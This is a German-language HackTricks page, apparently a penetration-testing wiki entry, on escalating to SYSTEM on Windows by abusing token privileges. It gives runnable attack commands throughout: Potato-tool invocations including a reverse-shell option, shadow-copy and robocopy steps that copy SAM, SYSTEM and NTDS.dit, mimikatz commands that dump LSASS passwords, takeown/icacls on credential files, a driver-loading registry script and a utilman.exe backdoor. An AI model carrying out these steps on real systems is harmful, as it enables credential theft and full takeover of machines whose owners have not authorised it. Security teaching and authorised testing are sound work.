# Tokens missbrauchen

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Wenn du **nicht weißt, was Windows Access Tokens sind**, lies diese Seite, bevor du fortfährst:


{{#ref}}
access-tokens.md
{{#endref}}

**Möglicherweise kannst du deine Privilegien eskalieren, indem du Tokens missbrauchst, die du bereits besitzt.**

### SeImpersonatePrivilege

Dieses Privileg ermöglicht einem Prozess, einen Token zu imitieren (aber nicht zu erstellen), wenn er ein Handle zu diesem Token erhalten kann. Ein privilegierter Token kann von einem Windows-Dienst (DCOM) bezogen werden, indem man ihn dazu bringt, eine NTLM-Authentifizierung bei einem Exploit durchzuführen. Dadurch kann anschließend ein Prozess mit SYSTEM-Privilegien ausgeführt werden.<sup>[[2]](#references)</sup> Diese Primitive lässt sich mit Tools wie [JuicyPotato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (erfordert, dass WinRM deaktiviert ist), [SweetPotato](https://github.com/CCob/SweetPotato) und [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) ausnutzen.

Eine ausschließlich an Loopback gebundene Webanwendung kann eine separate Möglichkeit zur Coercion darstellen, wenn ein lokaler Benutzer einen authentifizierten Endpoint erreichen kann, der unter einer privilegierteren Identität eine Anfrage an eine vom Aufrufer festgelegte URL sendet. Prüfe die Autorisierung und URL-Beschränkungen des Endpoints, die tatsächliche Identität des ausgehenden Clients und dessen Authentifizierungsverhalten sowie, ob dieser Client einen vom Benutzer mit geringeren Privilegien kontrollierten Listener erreichen kann. Ein aktiviertes `SeImpersonatePrivilege`, ein IIS-Listener oder ein URL-Fetch-Parameter allein belegen weder einen privilegierten Token noch einen Eskalationspfad. Führe diese Prüfung passiv durch; sende während der Enumeration keine Coercion-Anfragen. Siehe die Dokumentation von Microsoft zu [client impersonation](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation) und [IIS application-pool identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities).

Aktuelle Hinweise für Operatoren:

- **JuicyPotato ist veraltet**: Unter Windows 10 1809+/Server 2019+ solltest du je nach erreichbarer RPC/COM-Schnittstelle **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** oder **PrintSpoofer** bevorzugen.
- Wenn du einen Dienst kompromittiert hast, der als **`LOCAL SERVICE`** oder **`NETWORK SERVICE`** läuft, und `whoami /priv` einen **gefilterten Token** ohne `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege` anzeigt, stelle zuerst den **standardmäßigen Privilegien-Satz** des Kontos wieder her (zum Beispiel mit **FullPowers**) und versuche danach erneut die Potato-Familie.<sup>[[3]](#references)</sup>
- Einige neuere Forks sind für Operatoren komfortabler als die Original-Tools. **SigmaPotato** bietet beispielsweise Reflection/In-Memory-Ausführung und Kompatibilität mit modernen Windows-Versionen, während **PrintNotifyPotato** den PrintNotify-COM-Dienst missbraucht und oft nützlich ist, wenn der klassische Spooler-Pfad deaktiviert ist.

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Es ist **SeImpersonatePrivilege** sehr ähnlich und verwendet dieselbe Methode, um ein privilegiertes Token zu erhalten.\
Dieses Privileg ermöglicht es dann, **einem neuen oder angehaltenen Prozess ein primäres Token zuzuweisen**. Mit dem privilegierten Impersonation-Token kannst du ein primäres Token ableiten (DuplicateTokenEx).\
Mit diesem Token kannst du über 'CreateProcessAsUser' einen **neuen Prozess** erstellen oder einen angehaltenen Prozess erstellen und ihm **das Token zuweisen** (im Allgemeinen kannst du das primäre Token eines laufenden Prozesses nicht ändern).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Wenn dieses Token aktiviert ist, kannst du **KERB_S4U_LOGON** verwenden, um **ohne Kenntnis der Anmeldedaten ein Impersonation-Token** für beliebige andere Benutzer zu erhalten, **eine beliebige Gruppe** (Administratoren) zum Token hinzuzufügen, die **Integritätsstufe** des Tokens auf "**medium**" zu setzen und dieses Token dem **aktuellen Thread** zuzuweisen (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Dieses Privileg veranlasst das System, für beliebige Dateien **Lesezugriff zu gewähren** (beschränkt auf Lesevorgänge). Es wird verwendet, um **die Passwort-Hashes lokaler Administrator-Konten** aus der Registry auszulesen. Anschließend können Tools wie "**psexec**" oder "**wmiexec**" mit dem Hash verwendet werden (Pass-the-Hash-Technik). Diese Technik schlägt jedoch in zwei Fällen fehl: wenn das lokale Administratorkonto deaktiviert ist oder wenn eine Richtlinie Administratorrechte für lokale Administratoren entfernt, die sich remote verbinden.<sup>[[2]](#references)</sup>\
In der Praxis ist der zuverlässigste integrierte Ablauf in der Regel **VSS + `robocopy /b`**: Erstelle oder stelle eine Schattenkopie bereit und kopiere dann `SAM`/`SYSTEM` oder `NTDS.dit` im **Backup-Modus**, der die Dateiberechtigungen (ACLs) umgeht.<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

You can **diese Berechtigung missbrauchen** mit:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- indem du **IppSec** in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec) folgst
- Oder wie im Abschnitt **Rechteausweitung mit Backup Operators** erklärt:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Diese Berechtigung gewährt **Schreibzugriff** auf beliebige Systemdateien, unabhängig von der Access Control List (ACL) der Datei. Sie eröffnet zahlreiche Möglichkeiten zur Rechteausweitung, darunter die Möglichkeit, **Dienste zu ändern**, DLL Hijacking durchzuführen und über Image File Execution Options **Debugger** festzulegen sowie verschiedene weitere Techniken anzuwenden.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege ist eine leistungsstarke Berechtigung, die besonders nützlich ist, wenn ein Benutzer Tokens impersonieren kann, aber auch dann, wenn SeImpersonatePrivilege fehlt. Diese Fähigkeit beruht darauf, dass ein Token impersoniert werden kann, das denselben Benutzer repräsentiert und dessen Integritätsstufe nicht höher ist als die des aktuellen Prozesses.<sup>[[2]](#references)</sup>

**Wichtige Punkte:**

- **Impersonation ohne SeImpersonatePrivilege:** Unter bestimmten Bedingungen lässt sich SeCreateTokenPrivilege zur EoP nutzen, indem Tokens impersoniert werden.
- **Bedingungen für Token-Impersonation:** Eine erfolgreiche Impersonation setzt voraus, dass das Ziel-Token zum selben Benutzer gehört und eine Integritätsstufe hat, die kleiner oder gleich der Integritätsstufe des Prozesses ist, der die Impersonation versucht.
- **Erstellung und Änderung von Impersonation-Tokens:** Benutzer können ein Impersonation-Token erstellen und es erweitern, indem sie die SID (Security Identifier) einer privilegierten Gruppe hinzufügen.

### SeLoadDriverPrivilege

Diese Berechtigung erlaubt einem Prozess, **Gerätetreiber zu laden und zu entladen**, indem ein Registry-Eintrag mit bestimmten Werten für `ImagePath` und `Type` erstellt wird. Da direkter Schreibzugriff auf `HKLM` (HKEY_LOCAL_MACHINE) eingeschränkt ist, kann stattdessen `HKCU` (HKEY_CURRENT_USER) verwendet werden. Allerdings ist ein bestimmter Pfad erforderlich, damit der Kernel den `HKCU`-Eintrag als Treiberkonfiguration erkennt.<sup>[[2]](#references)</sup>

Bei modernen Angriffen kommt meist **BYOVD** (bring your own vulnerable driver) zum Einsatz: Ein **signierter, aber verwundbarer** Kernel-Treiber wird geladen und seine IOCTLs werden anschließend verwendet, um Schutzmaßnahmen zu deaktivieren oder Kernel-Code auszuführen. Beachte, dass auf neueren Windows 11/Server-Versionen die **Microsoft vulnerable driver blocklist** und/oder **HVCI/Memory Integrity** ältere öffentliche Angriffsketten oft unwirksam machen. Klassische Beispiele im Stil von `szkg64.sys` sind daher nicht mehr generell zuverlässig.

Der Pfad lautet `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, wobei `<RID>` der Relative Identifier des aktuellen Benutzers ist. In `HKCU` muss dieser gesamte Pfad erstellt und müssen zwei Werte festgelegt werden:<sup>[[2]](#references)</sup>

- `ImagePath`, der Pfad zur auszuführenden Binärdatei
- `Type` mit dem Wert `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Schritte:**

1. Verwende aufgrund des eingeschränkten Schreibzugriffs `HKCU` statt `HKLM`.
2. Erstelle in `HKCU` den Pfad `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, wobei `<RID>` dem Relative Identifier des aktuellen Benutzers entspricht.
3. Setze `ImagePath` auf den Ausführungspfad der Binärdatei.
4. Weise `Type` den Wert `SERVICE_KERNEL_DRIVER` (`0x00000001`) zu.

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

Weitere Möglichkeiten, dieses Privileg auszunutzen: [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Dies ähnelt **SeRestorePrivilege**. Seine Hauptfunktion ermöglicht es einem Prozess, **das Eigentum an einem Objekt zu übernehmen** und dabei die Anforderung eines expliziten diskretionären Zugriffs zu umgehen, indem WRITE_OWNER-Zugriffsrechte gewährt werden. Zunächst wird das Eigentum am vorgesehenen Registrierungsschlüssel übernommen, um Schreibzugriff zu erhalten. Anschließend wird die DACL geändert, um Schreibvorgänge zu ermöglichen.<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

Dieses Privileg erlaubt das **Debuggen anderer Prozesse**, einschließlich des Lesens und Schreibens im Arbeitsspeicher. Mit diesem Privileg lassen sich verschiedene Strategien zur Memory Injection einsetzen, die die meisten Antivirus- und Host-Intrusion-Prevention-Lösungen umgehen können.<sup>[[2]](#references)</sup>

Beachte bei modernen Windows-Versionen, dass `SeDebugPrivilege` normalerweise ausreicht, um **nicht geschützte SYSTEM-Prozesse** zu öffnen und deren Tokens zu duplizieren. Es garantiert jedoch **nicht**, dass du auf **LSASS** zugreifen kannst. Wenn **RunAsPPL / LSA Protection** aktiviert ist, können nicht geschützte Prozesse LSASS nicht lesen oder dort Code injizieren, selbst wenn `SeDebugPrivilege` vorhanden ist. In diesem Fall kannst du ein Token von einem anderen nicht durch PPL geschützten SYSTEM-Prozess stehlen oder stattdessen einen PPL-Bypass/BYOVD einsetzen, anstatt davon auszugehen, dass `procdump` funktioniert. Ein vollständiges Beispiel zum Kopieren eines Tokens mit `SeDebugPrivilege` + `SeImpersonatePrivilege` findest du auf [dieser Seite](sedebug-+-seimpersonate-copy-token.md).

#### Speicherabbild erstellen

Mit [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) aus der [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) kannst du **den Arbeitsspeicher eines Prozesses erfassen**. Das kann insbesondere beim Prozess **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** nützlich sein, der für das Speichern von Benutzeranmeldeinformationen verantwortlich ist, sobald sich ein Benutzer erfolgreich an einem System angemeldet hat.

Anschließend kannst du dieses Speicherabbild in mimikatz laden, um Passwörter auszulesen:

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

Ein zuvor gespeicherter, lesbarer LSASS-Dump ist möglicherweise verfügbar, auch wenn das aktuelle Konto nicht berechtigt ist, den laufenden geschützten Prozess zu erfassen. Betrachte eine Dump-Datei oder ein ähnlich benanntes Archiv zunächst nur als Hinweis: Überprüfe den Zugriff und den Inhalt und beurteile anschließend, ob wiederhergestellte Zugangsdaten noch gültig sind und Zugriff mit höheren Berechtigungen gewähren. Dateinamen allein beweisen weder, dass ein Archiv einen Dump enthält, noch dass die Zugangsdaten wiederverwendet werden können.

#### RCE

Wenn du eine `NT SYSTEM`-Shell erhalten möchtest, kannst du Folgendes verwenden:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

Dieses Recht (Perform volume maintenance tasks) kann privilegierte Volume-Operationen ermöglichen, garantiert aber nicht automatisch ein lesbares Raw-Volume-Handle oder beliebigen Dateizugriff. Geräte-ACLs, Token-Status, Windows-Version und die angeforderte Operation spielen weiterhin eine Rolle. Eine zulässige Volume-Steuerungsoperation kann stattdessen Dateisystem-ACLs ändern; dies ist eine verändernde Aktion, die sich potenziell auf das gesamte Volume auswirkt. Auf einem CA-Host erfordert Certificate Abuse außerdem Zugriff auf verwendbares Private-Key-Material, und für EFS-geschützte Dateien ist weiterhin ein autorisierter Entschlüsselungs- oder Wiederherstellungsschlüssel erforderlich. Die detaillierten Voraussetzungen findest du weiter unten.<sup>[[5]](#references)</sup>

Ausführliche Techniken und Gegenmaßnahmen:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Berechtigungen überprüfen

```
whoami /priv
```

Die **Tokens, die als Disabled angezeigt werden**, lassen sich normalerweise aktivieren. Daher kannst du oft sowohl _Enabled_- als auch _Disabled_-Berechtigungen missbrauchen.

### Alle Tokens aktivieren

Wenn du deaktivierte Berechtigungen hast, kannst du das Skript [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) verwenden, um alle Tokens zu aktivieren:

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

Oder das **Skript**, das in diesem [**Beitrag**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) eingebettet ist.

## Tabelle

Ein vollständiger Spickzettel zu Token-Berechtigungen findet sich unter [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin). Die folgende Zusammenfassung listet nur direkte Möglichkeiten auf, die Berechtigung auszunutzen, um eine Admin-Sitzung zu erhalten oder sensible Dateien zu lesen.<sup>[[1]](#references)</sup>

| Berechtigung               | Auswirkung  | Tool                    | Ausführungspfad                                                                                                                                                                                                                                                                                                                                     | Anmerkungen                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | Drittanbieter-Tool      | _"Damit könnte ein Benutzer Tokens impersonieren und mit Tools wie potato.exe, rottenpotato.exe und juicypotato.exe zu NT SYSTEM eskalieren."_                                                                                                                                                                                                       | Danke an [Aurélien Chalot](https://twitter.com/Defte_) für die Aktualisierung. Ich werde versuchen, es bald rezeptartiger zu formulieren.                                                                                                                                                                                         |
| **`SeBackup`**             | **Bedrohung** | _**Integrierte Befehle**_ | Sensible Dateien mit `robocopy /b` oder speziellen SeBackup-fähigen Kopier-Helpers lesen.                                                                                                                                                                                                                                                            | <p>- Ideal für `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` und manchmal `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` ist praktisch, aber spezielle SeBackup-Cmdlets/APIs sind bei gesperrten/geöffneten Dateien oft flexibler.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | Drittanbieter-Tool      | Mit `NtCreateToken` ein beliebiges Token erstellen, das lokale Admin-Rechte enthält.                                                                                                                                                                                                                                                                 |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Ein **nicht-PPL**-SYSTEM-Token duplizieren oder den Speicher eines nicht geschützten Prozesses auslesen.                                                                                                                                                                                                                                              | <p>Das Auslesen von LSASS wird häufig blockiert, wenn RunAsPPL/LSA Protection aktiviert ist.</p><p>Skript verfügbar bei [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | Drittanbieter-Tool      | Die **Potato-Familie** / Impersonation über Named Pipes verwenden, um SYSTEM zu starten (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato` usw.).                                                                                                                                                                         | <p>Am praktischsten bei Dienstkonten wie IIS APPPOOL, MSSQL, geplanten Tasks oder jedem Kontext, der bereits über `SeImpersonatePrivilege` verfügt.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | Drittanbieter-Tool      | <p>1. Einen signierten, aber verwundbaren Kernel-Treiber laden (BYOVD)<br>2. Die IOCTLs des Treibers verwenden, um Kernel-R/W zu erhalten, Sicherheitstools zu deaktivieren oder zu SYSTEM zu eskalieren<br><br>Alternativ kann die Berechtigung verwendet werden, um sicherheitsrelevante Treiber mit dem integrierten Befehl <code>fltMC</code> zu entladen, z. B. <code>fltMC sysmondrv</code></p> | <p>Ältere öffentliche Treiber wie <code>szkg64.sys</code> werden auf modernen Windows-Systemen zunehmend durch die Blockliste für verwundbare Treiber / HVCI blockiert.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. PowerShell/ISE starten, während die SeRestore-Berechtigung vorhanden ist.<br>2. Die Berechtigung mit <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>) aktivieren.<br>3. utilman.exe in utilman.old umbenennen<br>4. cmd.exe in utilman.exe umbenennen<br>5. Die Konsole sperren und Win+U drücken</p> | <p>Der Angriff kann von bestimmter AV-Software erkannt werden.</p><p>Eine alternative Methode beruht darauf, mit derselben Berechtigung Dienst-Binärdateien in "Program Files" zu ersetzen.</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Integrierte Befehle**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. cmd.exe in utilman.exe umbenennen<br>4. Die Konsole sperren und Win+U drücken</p>                                                                                                                                  | <p>Der Angriff kann von bestimmter AV-Software erkannt werden.</p><p>Eine alternative Methode beruht darauf, mit derselben Berechtigung Dienst-Binärdateien in "Program Files" zu ersetzen.</p>                                                                                                                                   |
| **`SeTcb`**                | _**Admin**_ | Drittanbieter-Tool      | <p>Tokens so manipulieren, dass sie lokale Admin-Rechte enthalten. Möglicherweise ist SeImpersonate erforderlich.</p><p>Noch zu überprüfen.</p>                                                                                                                                                                                                         |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin – Ausnutzungspfade von Windows-Berechtigungen zu Admin-Rechten](https://github.com/gtworek/Priv2Admin)
- [2] [Missbrauch von Token-Berechtigungen für LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Gebt mir meine Berechtigungen zurück! Bitte?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (`/b` im Backup-Modus umgeht ACL-Prüfungen für Dateien/Ordner)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Aufgaben zur Volume-Wartung ausführen (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → CA-Schlüssel-Exfiltration → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
